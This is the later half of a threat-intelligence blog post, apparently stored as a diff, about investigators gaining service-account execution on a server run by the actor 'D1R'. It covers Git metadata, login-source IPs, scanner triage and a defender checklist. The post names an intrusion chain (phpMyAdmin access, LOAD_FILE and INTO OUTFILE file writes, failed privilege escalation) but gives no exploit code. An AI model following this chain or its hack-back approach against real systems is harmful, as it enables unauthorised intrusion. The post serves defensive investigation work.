+<p>Inside /home/user/new-theme/.git, a remote named production pointed to root@205.196.83.133:/opt/deploy/new-theme/repo.git. A small config file, but with a useful infrastructure relationship baked into it.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image8.png" alt=""></p>
+<p><em>The production remote in the local Git configuration. The root username is config text, not proof of credentials, authentication, or access to that host.</em></p>
+<p>The Git transcripts showed local master and the production tracking ref at the same commit. Three commits, dated April 1, 3, and 4, 2026, ran from an initial commit through download-link styling to a download-button fix. The newest change listed shop-related CSS and JavaScript; the one before it touched functions.php and footer.php.</p>
+<p>The generic identity root &#x3C;<a href="mailto:root@debian.debian">root@debian.debian</a>> ran through the whole history. Those fields and the +03:00 offset don’t identify a person or a place; Git authors, committers, and dates are all set locally and can be anything. Backup variants and an editor swap file pointed to development residue, but they didn’t prove which files the live portal actually served.</p>
+<h1 id="session-records-supplied-a-different-kind-of-address">Session records supplied a different kind of address</h1>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image9.png" alt=""></p>
+<p><em>Two user terminal entries showing source address 5.228.116.200 and sudo -i. Existing admin sessions aren’t proof that the investigator’s daemon session escalated.</em></p>
+<p>The full transcript also showed an established SSH connection from 5.228.116.200 and historical user logins from several other 5.228.116/117 addresses. Enrichment tied some of those addresses to AS42610 and to Russian provider and location labels. I treated that as service-reported context, not proof of anyone’s nationality or physical location.</p>
+<p>Three address roles had to stay separate: a configured Git deployment destination, the login-source fields, and the earlier public egress observation of 157.254.167.45. Collapsing them into a single “real IP” would throw away the different evidence behind each one.</p>
+<h1 id="virustotal-added-context-to-the-login-sources">VirusTotal added context to the login sources</h1>
+<p>The login-source addresses were useful pivots for context, so I kept the VirusTotal captures alongside the session evidence. They describe what the service displayed when captured; I did not turn their detection counters or provider labels into a verdict about the person behind a session.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/virustotal-5.228.116.200.png" alt=""></p>
+<p><em>VirusTotal capture for 5.228.116.200: 0/92 detections, AS42610 / Rostelecom, and an RU label. The Historical Whois panel displays RT.RU domain information last updated in 2021; it is not a subscriber record for the observed SSH source.</em></p>
+<p>For 5.228.116.200, the stronger connection to this investigation came from the recorded user sessions and the displayed SSH peer. VirusTotal supplied provider and reputation context around that observation. The historical domain record did not identify the account’s human owner, and the country label did not establish where the operator was physically sitting.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/virustotal-5.228.117.126.png" alt=""></p>
+<p><em>VirusTotal capture for the historical login source 5.228.117.126: 0/92 detections, AS42610 / Rostelecom and network/registration details. A separate banner reports two detected files communicating with the IP; their hashes, connection times and relevance to D1R are not shown.</em></p>
+<p>Those two findings can exist together: an IP detection count of zero and relationships to files that have detections. Neither proves that this address was safe or malicious during the recorded login. Without the related file identities and timing, the banner does not establish that those files were used here.</p>
+<p>For a blue team, the next useful correlation would be the source address plus the login time, target account, SSH session and sudo activity. I would preserve the raw timestamps and source records before normalizing them. I would not block an entire provider range, assign nationality, or merge these login sources with the Git destination and public egress IP just because the addresses appeared in the same investigation.</p>
+<p><em>These are supplied screenshots, not fresh lookups. Their capture time is not established, and the displayed reputation must not be presented as a current VirusTotal result.</em></p>
+<h1 id="the-scanner-was-loud-and-the-full-transcript-mattered">The scanner was loud and the full transcript mattered</h1>
+<p>Once code was running as daemon, privilege escalation was the obvious next question. The reported CopyFail attempt didn’t succeed. LinPEAS then printed candidate findings, among them Dirty Frag checks and an Open vSwitch-related check, flagged with labels like LIKELY VULNERABLE and POTENTIAL ROOT LPE.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image10.png" alt=""></p>
+<p><em>The scanner screenshot and its candidate labels. Those labels are triage output, not a record of successful exploitation.</em></p>
+<p>The complete log changed how I read that screen. The generic registry compared against 6.1.0.54, while the fuller build and package data reported Debian 6.1.190-1. A distribution’s release label and its patched package version aren’t the same number, and treating them as interchangeable is how you get false version matches.</p>
+<p>The same transcript carried negative or already-fixed results for other checks, including a Copy Fail runtime probe. These were still tool-reported assessments that needed validation against trusted package and advisory data. No root escalation was demonstrated. The daemon context and the failed shadow-file access checks stayed as hard limits on what I could claim.</p>
+<h1 id="what-a-blue-team-could-correlate-across-the-chain">What a blue team could correlate across the chain</h1>
+<p>The host profile made the defensive questions more concrete. I would look for the same sequence across independent records, rather than expect one alert to explain the entire chain:</p>
+<ul>
+<li><strong>Database administration:</strong> correlate phpMyAdmin web requests and any available authentication/session records with MariaDB client identity and query/audit logs. Preserve the actual account and connection source; a missing login prompt by itself does not identify either one.</li>
+<li><strong>Database file operations:</strong> review recorded LOAD_FILE and INTO OUTFILE activity, changes to general_log and general_log_file, and their timing against file creation. Query-audit coverage depends on the logging that was actually enabled.</li>
+<li><strong>Filesystem artifacts:</strong> preserve suspicious functions.php files under /tmp or /var/tmp, including hashes, ownership, permissions and timestamps. Keep them separate from legitimate theme files and investigator-created test artifacts.</li>
+<li><strong>WordPress state:</strong> compare template and stylesheet option values with trusted settings and available change history. Pair those changes with PHP/web-server errors, failed plugin/theme writes, and the requests associated with execution.</li>
+<li><strong>Execution and outbound traffic:</strong> correlate Apache/PHP activity under daemon with process and network telemetry, including callbacks or unexpected destinations. A loopback address on a local listener is not enough to identify the remote origin.</li>
+<li><strong>Interactive access:</strong> pair SSH authentication records, session identifiers and sudo events for the user account with the observed login-source addresses. Two terminal rows can belong to one underlying connection; an existing privileged session is not evidence that the daemon shell escalated.</li>
+</ul>
+<p>The goal would be to reconstruct who or what changed state, under which identity, and in what order. Gaps need to stay visible: no query log or missing authentication history means limited visibility, not proof that the activity never happened. Database root, Apache daemon and Linux root should remain separate throughout that timeline.</p>
+<h1 id="what-the-complete-investigation-adds-up-to">What the complete investigation adds up to</h1>
+<p>The strongest chain here runs from unauthenticated, privileged database access to local-file disclosure, exposed WordPress secrets, and recorded execution as a service account. Git metadata and login records added context about development and access, though with tighter attribution limits than they first appear to offer.</p>
+<p>For defenders, the work sits at those boundaries: lock down database administration, drop global and FILE privileges, keep executable application content isolated from writable paths, protect repository integrity, rotate the exposed secrets, and confirm cleanup actually happened. The full log also held a suspected password-logging excerpt and world-writable repository files, both of which needed separate validation before anyone leans on them.</p>
+<p>D1R’s Synopsys claim is what brought me to the portal. The evidence behind the portal turned out to be the more substantial technical story. The complete D1R CTI Report v8 keeps the source hashes, original exhibits, Git chronology, and finding-by-finding confirmation limits for anyone who wants to follow every link.</p>
+<p>Investigation and analysis by Ahmed Elessaway and Abdelhameed Ghazy. The opening alert and access sequence follow our own account of the work. The victim-breach, supply-chain, and ARM Athena DM leak claims are not independently authenticated here. Evidence reviewed November 15-16, 2026. Personal attribution and a successful local privilege escalation both remain unconfirmed. Live credentials and WordPress secret values are withheld.</p> </div> <!-- Dossier Footer & Author Monogram --> <footer class="article-dossier-footer"> <div class="article-author-card"> <img src="/logo-me.png" alt="Ahmed Elessaway (xElessaway)" class="article-author-avatar-img"> <div class="article-author-info"> <p class="eyebrow">Investigator / Author</p> <h3 class="article-author-name">Ahmed Elessaway (xElessaway)</h3> <p class="article-author-bio">
+Cybersecurity researcher specializing in DFIR, threat intelligence, and OSINT investigation methodologies.
+</p> <div class="article-author-links"> <a href="https://www.linkedin.com/in/ahmedelessaway/" target="_blank" rel="noreferrer" class="author-social-pill"> <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg> <span>LinkedIn</span> </a><a href="https://x.com/ahmed_elessaway" target="_blank" rel="noreferrer" class="author-social-pill"> <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg> <span>X</span> </a><a href="https://xelessaway.medium.com/" target="_blank" rel="noreferrer" class="author-social-pill"> <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M13.54 12a6.8 6.8 0 01-6.77 6.82A6.8 6.8 0 010 12a6.8 6.8 0 016.77-6.82A6.8 6.8 0 0113.54 12zM20.96 12c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"></path></svg> <span>Medium</span> </a> </div> </div> </div> <div class="article-nav-actions"> <a href="/blog/" class="button button-primary"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+Browse All Research
+</a> <a href="/ctf/" class="button button-ghost">
+Explore Practice Lab
+<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class aria-hidden="true"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg> </a> </div> </footer> </main> </div>  </main> <footer class="site-footer"> <div class="container footer-grid"> <div class="footer-brand-wrap"> <a class="footer-brand" href="/"> <img src="/logo-me.png" alt="Ahmed Elessaway" class="footer-avatar"> <span>xElessaway</span> </a> <p class="footer-copy">Field notes, investigations, and practical security research.</p> </div> <div class="footer-links footer-links-inline"> <a href="/" class="footer-nav-link">Home</a><a href="/blog/" class="footer-nav-link">Research</a><a href="/threat-intelligence/" class="footer-nav-link">Threat Intel</a><a href="/tools/" class="footer-nav-link">Tools</a><a href="/ctf/" class="footer-nav-link">Practice</a><a href="/about/" class="footer-nav-link">Profile</a> </div> <div class="footer-links footer-links-inline footer-links-right"> <a href="https://www.linkedin.com/in/ahmedelessaway/" target="_blank" rel="noreferrer" class="footer-social-link" title="LinkedIn"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg> <span>LinkedIn</span> </a><a href="https://x.com/ahmed_elessaway" target="_blank" rel="noreferrer" class="footer-social-link" title="X"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg> <span>X</span> </a><a href="https://xelessaway.medium.com/" target="_blank" rel="noreferrer" class="footer-social-link" title="Medium"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class aria-hidden="true"><path d="M13.54 12a6.8 6.8 0 01-6.77 6.82A6.8 6.8 0 010 12a6.8 6.8 0 016.77-6.82A6.8 6.8 0 0113.54 12zM20.96 12c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"></path></svg> <span>Medium</span> </a> </div> </div> </footer> <dialog class="image-lightbox" data-image-lightbox aria-label="Expanded image viewer"> <button class="image-lightbox-close" type="button" data-image-lightbox-close aria-label="Close image viewer">
+Close
+</button> <img class="image-lightbox-media" data-image-lightbox-media alt=""> <p class="image-lightbox-caption" data-image-lightbox-caption hidden></p> </dialog> <script>
+      const lightbox = document.querySelector("[data-image-lightbox]");
+      const lightboxMedia = lightbox?.querySelector("[data-image-lightbox-media]");
+      const lightboxCaption = lightbox?.querySelector("[data-image-lightbox-caption]");
+      const lightboxClose = lightbox?.querySelector("[data-image-lightbox-close]");
+
+      const isZoomableImage = (element) =>
+        element instanceof HTMLImageElement &&
+        (element.matches(".prose img") || element.matches(".challenge-image") || element.hasAttribute("data-zoomable-image"));
+
+      const setZoomableState = () => {
+        document.querySelectorAll(".prose img, .challenge-image, img[data-zoomable-image]").forEach((element) => {
+          if (element instanceof HTMLImageElement) {
+            element.tabIndex = 0;
+            element.setAttribute("role", "button");
+            element.setAttribute("aria-haspopup", "dialog");
+          }
+        });
+      };
+
+      const openLightbox = (image) => {
+        if (!(lightbox instanceof HTMLDialogElement) || !(lightboxMedia instanceof HTMLImageElement)) {
+          return;
+        }
+
+        lightboxMedia.src = image.currentSrc || image.src;
+        lightboxMedia.alt = image.alt || "";
+
+        if (lightboxCaption instanceof HTMLElement) {
+          const caption = image.alt?.trim();
+          lightboxCaption.textContent = caption ?? "";
+          lightboxCaption.hidden = !caption;
+        }
+
+        lightbox.showModal();
+      };
+
+      const closeLightbox = () => {
+        if (lightbox instanceof HTMLDialogElement && lightbox.open) {
+          lightbox.close();
+        }
+      };
+
+      document.addEventListener("click", (event) => {
+        const target = event.target;
+
+        if (target instanceof Element) {
+          const image = target.closest(".prose img, .challenge-image, img[data-zoomable-image]");
+
+          if (isZoomableImage(image)) {
+            event.preventDefault();
+            openLightbox(image);
+            return;
+          }
+        }
+
+        if (target === lightbox || target === lightboxClose) {
+          closeLightbox();
+        }
+      });
+
+      document.addEventListener("keydown", (event) => {
+        const target = event.target;
+
+        if ((event.key === "Enter" || event.key === " ") && isZoomableImage(target)) {
+          event.preventDefault();
+          openLightbox(target);
+        }
+      });
+
+      const setupCollapsibleTables = () => {
+        document.querySelectorAll(".prose table").forEach((table) => {
+          if (!(table instanceof HTMLTableElement) || table.dataset.collapsedInitialized) {
+            return;
+          }
+          table.dataset.collapsedInitialized = "true";
+
+          const rows = table.querySelectorAll("tbody tr");
+          const rowCount = rows.length;
+
+          // Only collapse tables that have more than 10 rows
+          if (rowCount <= 10) {
+            // Still ensure responsive wrapper if not already present
+            const existingWrap = table.closest(".table-responsive-wrap, .table-collapse-wrap");
+            if (!existingWrap) {
+              const resWrap = document.createElement("div");
+              resWrap.className = "table-responsive-wrap";
+              table.parentNode?.insertBefore(resWrap, table);
+              resWrap.appendChild(table);
+            }
+            return;
+          }
+
+          // Build collapsible container
+          const collapseWrap = document.createElement("div");
+          collapseWrap.className = "table-collapse-wrap";
+
+          const viewport = document.createElement("div");
+          viewport.className = "table-collapse-viewport is-collapsed";
+
+          const resWrap = document.createElement("div");
+          resWrap.className = "table-responsive-wrap";
+
+          const fadeOverlay = document.createElement("div");
+          fadeOverlay.className = "table-fade-overlay";
+
+          const toggleBar = document.createElement("div");
+          toggleBar.className = "table-toggle-bar";
+
+          const toggleBtn = document.createElement("button");
+          toggleBtn.type = "button";
+          toggleBtn.className = "table-toggle-btn";
+          toggleBtn.setAttribute("aria-expanded", "false");
+          toggleBtn.innerHTML = `
+            <span class="table-doodle-stamp">
+              <span class="pulse-dot" aria-hidden="true"></span>
+              <span class="table-toggle-label">SHOW ALL ${rowCount} RECORDS</span>
+            </span>
+            <svg class="table-doodle-chevron" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M6 9l6 6 6-6"></path>
+            </svg>
+          `;
+
+          toggleBtn.addEventListener("click", () => {
+            const isCollapsed = viewport.classList.toggle("is-collapsed");
+            const label = toggleBtn.querySelector(".table-toggle-label");
+            if (isCollapsed) {
+              toggleBtn.classList.remove("is-expanded");
+              toggleBtn.setAttribute("aria-expanded", "false");
+              if (label) label.textContent = `SHOW ALL ${rowCount} RECORDS`;
+              collapseWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
+            } else {
+              toggleBtn.classList.add("is-expanded");
+              toggleBtn.setAttribute("aria-expanded", "true");
+              if (label) label.textContent = `COLLAPSE TABLE (${rowCount} RECORDS)`;
+            }
+          });
+
+          toggleBar.appendChild(toggleBtn);
+
+          // Insert structure around table
+          table.parentNode?.insertBefore(collapseWrap, table);
+          resWrap.appendChild(table);
+          viewport.appendChild(resWrap);
+          viewport.appendChild(fadeOverlay);
+          collapseWrap.appendChild(viewport);
+          collapseWrap.appendChild(toggleBar);
+        });
+      };
+
+      setZoomableState();
+      setupCollapsibleTables();
+      document.addEventListener("astro:page-load", () => {
+        setZoomableState();
+        setupCollapsibleTables();
+      });
+    </script> </body> </html>
